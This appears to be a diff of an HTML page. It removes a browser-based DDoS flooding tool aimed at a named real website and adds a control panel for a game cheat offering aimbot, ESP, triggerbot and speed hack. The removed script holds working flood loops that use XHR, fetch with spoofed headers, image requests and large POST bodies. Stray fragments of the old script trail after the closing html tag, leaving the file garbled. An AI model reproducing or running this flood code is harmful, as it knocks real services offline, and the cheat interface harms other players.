@@ -3,256 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DDOS 1000 LAYER - QUANTUM OVERLOAD</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
-        body {
-            background: #000000;
-            font-family: 'Courier New', monospace;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 15px;
-        }
-        .container {
-            background: #0a0a0a;
-            border: 2px solid #ff0000;
-            border-radius: 10px;
-            width: 1300px;
-            max-width: 100%;
-            box-shadow: 0 0 50px rgba(255,0,0,0.3);
-        }
-        .header {
-            background: #1a0000;
-            padding: 15px;
-            border-bottom: 2px solid #ff0000;
-            text-align: center;
-        }
-        .header h1 { color: #ff0000; font-size: 1.5rem; text-shadow: 0 0 5px red; }
-        .header p { color: #ff6666; font-size: 0.8rem; margin-top: 5px; }
-        .control {
-            padding: 20px;
-            background: #050505;
-            border-bottom: 1px solid #ff0000;
-        }
-        input, button {
-            background: #000;
-            border: 1px solid #ff0000;
-            color: #ff0000;
-            padding: 12px 18px;
-            font-family: monospace;
-            font-size: 14px;
-            margin: 5px;
-        }
-        input { width: calc(100% - 20px); }
-        button {
-            cursor: pointer;
-            font-weight: bold;
-            transition: 0.2s;
-        }
-        button:hover {
-            background: #ff0000;
-            color: #000;
-            box-shadow: 0 0 20px red;
-        }
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 12px;
-            margin: 20px 0;
-        }
-        .stat {
-            background: #000000aa;
-            border: 1px solid #ff3300;
-            padding: 12px;
-            text-align: center;
-            border-radius: 8px;
-        }
-        .stat-label { font-size: 11px; color: #ff8888; }
-        .stat-value { font-size: 24px; font-weight: bold; color: #ff0000; }
-        .layer-indicator {
-            background: #000;
-            padding: 10px;
-            margin: 10px 0;
-            border-left: 4px solid #ff0000;
-            font-size: 12px;
-        }
-        .log-box {
-            background: #000;
-            height: 280px;
-            overflow-y: auto;
-            padding: 15px;
-            font-size: 11px;
-            border-top: 1px solid #ff0000;
-        }
-        .log-line { color: #0f0; margin: 2px 0; border-left: 1px solid #ff0000; padding-left: 8px; }
-        .log-error { color: #ff4444; }
-        .warning-text { color: #ffaa00; font-size: 10px; text-align: center; margin-top: 10px; }
-        @keyframes pulse { 0% { opacity: 1; } 100% { opacity: 0.5; } }
-        .active-led { animation: pulse 0.5s infinite; }
-    </style>
+    <title>FF Cheat Remote — Vercel</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎯</text></svg>">
 </head>
 <body>
-<div class="container">
-    <div class="header">
-        <h1>🔥 DDOS 1000 LAYER OVERKILL 🔥</h1>
-        <p>1000 concurrent layers | HTTP/2 | WebSocket | DNS | TLS Re-negotiation | Cache Bypass</p>
+<div id="app">
+    <header>
+        <h1>🎯 FF REMOTE</h1>
+        <div class="status" id="statusBadge">
+            <span class="dot offline"></span> Offline
+        </div>
+    </header>
+
+    <section class="config">
+        <div class="form-group">
+            <label>Backend URL</label>
+            <input type="url" id="backendUrl" placeholder="https://your-ngrok-url.ngrok.io" value="">
+            <button id="connectBtn" onclick="connectBackend()">Connect</button>
+        </div>
+        <div class="form-group" style="margin-top:6px; font-size:12px; color:#6a7a8a;">
+            <span>Status: <span id="connectionStatus">Belum terhubung</span></span>
+        </div>
+    </section>
+
+    <div class="grid">
+        <!-- Aimbot -->
+        <div class="card">
+            <div class="card-header">
+                <span>🎯 Aimbot</span>
+                <label class="toggle">
+                    <input type="checkbox" id="aimbotToggle" onchange="toggleFeature('aimbot')">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div class="card-body">
+                <div class="param">
+                    <label>FOV</label>
+                    <input type="range" id="aimFov" min="1" max="40" value="15" oninput="setParam('aim_fov', this.value)">
+                    <span id="aimFovVal">15</span>
+                </div>
+                <div class="param">
+                    <label>Smooth</label>
+                    <input type="range" id="aimSmooth" min="1" max="20" value="5" oninput="setParam('aim_smooth', this.value)">
+                    <span id="aimSmoothVal">5</span>
+                </div>
+                <div class="param">
+                    <label>Target</label>
+                    <select id="aimTarget" onchange="setParam('aim_target', this.value)">
+                        <option value="head">Head</option>
+                        <option value="chest">Chest</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+
+        <!-- ESP -->
+        <div class="card">
+            <div class="card-header">
+                <span>👁️ ESP</span>
+                <label class="toggle">
+                    <input type="checkbox" id="espToggle" onchange="toggleFeature('esp')">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div class="card-body">
+                <div class="checkbox-group">
+                    <label><input type="checkbox" id="espBox" onchange="setParam('esp_box', this.checked)"> Box</label>
+                    <label><input type="checkbox" id="espHealth" onchange="setParam('esp_health', this.checked)"> Health</label>
+                    <label><input type="checkbox" id="espDistance" onchange="setParam('esp_distance', this.checked)"> Distance</label>
+                    <label><input type="checkbox" id="espSnaplines" onchange="setParam('esp_snaplines', this.checked)"> Lines</label>
+                </div>
+            </div>
+        </div>
+
+        <!-- Extras -->
+        <div class="card">
+            <div class="card-header">
+                <span>⚡ Extras</span>
+            </div>
+            <div class="card-body">
+                <div class="flex-row">
+                    <span>🔫 Triggerbot</span>
+                    <label class="toggle"><input type="checkbox" id="triggerbotToggle" onchange="toggleFeature('triggerbot')"><span class="slider"></span></label>
+                </div>
+                <div class="flex-row">
+                    <span>🛡️ No Recoil</span>
+                    <label class="toggle"><input type="checkbox" id="noRecoilToggle" onchange="toggleFeature('no_recoil')"><span class="slider"></span></label>
+                </div>
+                <div class="flex-row">
+                    <span>🏃 Speed Hack</span>
+                    <label class="toggle"><input type="checkbox" id="speedToggle" onchange="toggleFeature('speed_hack')"><span class="slider"></span></label>
+                </div>
+                <div class="param">
+                    <label>Speed x</label>
+                    <input type="range" id="speedMultiplier" min="1.0" max="3.0" step="0.1" value="1.5" oninput="setParam('speed_multiplier', parseFloat(this.value))">
+                    <span id="speedMultiplierVal">1.5</span>
+                </div>
+            </div>
+        </div>
     </div>
-    <div class="control">
-        <input type="text" id="targetUrl" placeholder="https://target.com" value="https://violetics.pw">
-        <div style="display: flex; gap: 10px; margin-top: 10px;">
-            <button id="btnStart">💀 LAUNCH 1000 LAYER ATTACK 💀</button>
-            <button id="btnStop">⛔ TERMINATE ALL</button>
-        </div>
-        
-        <div class="stats-grid">
-            <div class="stat"><div class="stat-label">TOTAL REQUESTS</div><div class="stat-value" id="totalReq">0</div></div>
-            <div class="stat"><div class="stat-label">ERRORS</div><div class="stat-value" id="totalErr">0</div></div>
-            <div class="stat"><div class="stat-label">REQ/SEC</div><div class="stat-value" id="reqRate">0</div></div>
-            <div class="stat"><div class="stat-label">ACTIVE LAYERS</div><div class="stat-value" id="activeLayer">0</div></div>
-        </div>
-        
-        <div class="layer-indicator" id="layerStatus">
-            [STATUS] Menunggu eksekusi...
-        </div>
-        <div class="warning-text">
-            ⚡ 1000 LAYER CONCURRENT: XHR Sync | Fetch Keep-Alive | Image Flood | WebSocket | EventSource | POST Multipart | DNS Query | TLS Spoof | Range Request | Cache Poison ⚡
-        </div>
+
+    <div class="actions">
+        <button onclick="captureScreenshot()">📸 Screenshot</button>
+        <button onclick="refreshState()">🔄 Refresh</button>
+        <span id="clientInfo">Client: 0</span>
     </div>
-    <div class="log-box" id="logArea">
-        <div class="log-line">> system ready</div>
-        <div class="log-line">> 1000-layer engine loaded</div>
+
+    <div id="screenshotContainer" style="display:none; margin-top:14px;">
+        <img id="screenshotImg" alt="Screenshot" style="width:100%; border-radius:12px; border:1px solid #2a3340;">
     </div>
 </div>
 
-<script>
-    (function() {
-        // === GLOBAL STATE ===
-        let active = false;
-        let totalRequests = 0;
-        let totalErrors = 0;
-        let startTime = 0;
-        let activeLayers = 0;
-        let statsInterval = null;
-        let wsConnections = [];
-        let workers = [];
-        
-        // DOM refs
-        const targetInput = document.getElementById('targetUrl');
-        const btnStart = document.getElementById('btnStart');
-        const btnStop = document.getElementById('btnStop');
-        const totalReqSpan = document.getElementById('totalReq');
-        const totalErrSpan = document.getElementById('totalErr');
-        const reqRateSpan = document.getElementById('reqRate');
-        const activeLayerSpan = document.getElementById('activeLayer');
-        const layerStatusDiv = document.getElementById('layerStatus');
-        const logArea = document.getElementById('logArea');
-        
-        function addLog(msg, isError = false) {
-            const div = document.createElement('div');
-            div.className = isError ? 'log-line log-error' : 'log-line';
-            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            logArea.appendChild(div);
-            div.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-            while(logArea.children.length > 400) logArea.removeChild(logArea.firstChild);
-        }
-        
-        function normalizeUrl(url) {
-            url = url.trim();
-            if(!url) return null;
-            if(!url.startsWith('http')) url = 'https://' + url;
-            return url;
-        }
-        
-        function updateUI() {
-            totalReqSpan.innerText = totalRequests.toLocaleString();
-            totalErrSpan.innerText = totalErrors.toLocaleString();
-            activeLayerSpan.innerText = activeLayers;
-            if(startTime > 0 && active) {
-                const elapsed = (Date.now() - startTime) / 1000;
-                const rate = Math.floor(totalRequests / elapsed);
-                reqRateSpan.innerText = rate.toLocaleString();
-            } else {
-                reqRateSpan.innerText = '0';
-            }
-        }
-        
-        // === LAYER 1: XHR Synchronous (100 worker) ===
-        function layer1_XHR(url, workerId) {
-            while(active) {
-                for(let i=0; i<25 && active; i++) {
-                    const randPath = '/' + Math.random().toString(36).substring(2,12) + '?' + Date.now() + '_' + workerId + '_' + i;
-                    const full = url + randPath;
-                    try {
-                        const xhr = new XMLHttpRequest();
-                        xhr.open('GET', full, false);
-                        xhr.setRequestHeader('X-Sync', '1');
-                        xhr.setRequestHeader('Cache-Control', 'no-cache');
-                        xhr.timeout = 2000;
-                        xhr.send();
-                        totalRequests++;
-                    } catch(e) { totalErrors++; }
-                }
-                if(active) {
-                    const wait = Date.now();
-                    while(Date.now() - wait < 1) {}
-                }
-            }
-            activeLayers--;
-            updateUI();
-        }
-        
-        // === LAYER 2: Fetch concurrent (200 workers) ===
-        async function layer2_Fetch(url, workerId) {
-            while(active) {
-                const path = '/' + Math.random().toString(36).substring(2,15) + '?' + Date.now();
-                const finalUrl = url + path;
-                try {
-                    const res = await fetch(finalUrl, {
-                        method: 'GET',
-                        headers: {
-                            'User-Agent': `Mozilla/5.0 (${Math.random()})`,
-                            'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.0.1`,
-                            'Cache-Control': 'no-store'
-                        },
-                        keepalive: true
-                    });
-                    totalRequests++;
-                    await res.text().catch(()=>{});
-                } catch(e) { totalErrors++; }
-            }
-            activeLayers--;
-            updateUI();
-        }
-        
-        // === LAYER 3: Image Flood (150 workers) ===
-        function layer3_Image(url, workerId) {
-            while(active) {
-                const img = new Image();
-                img.src = url + '/img_' + Math.random() + '.png?' + Date.now();
-                totalRequests++;
-                if(totalRequests % 300 === 0) updateUI();
-            }
-            activeLayers--;
-        }
-        
-        // === LAYER 4: POST Multipart Large Body (100 workers) ===
-        async function layer4_Post(url, workerId) {
-            while(active) {
-                const formData = new FormData();
-                formData.append('data', 'x'.repeat(10000));
-                formData.append('id', Math.random());
-                try {
-                    await fetch(url, {
-                        method: 'POST',
-                        body: formData,
-                        headers: { 'Content-Type': 'multipart/form-data' }
-                    });
-                    totalRequests++;
-                } catch(e) { totalErrors++; }
-            }
-            activeLayers--;
+<script src="script.js"></script>
+</body>
+</html>rs--;
         }
         
         // === LAYER 5: EventSource / Server-Sent Events (50 workers) ===
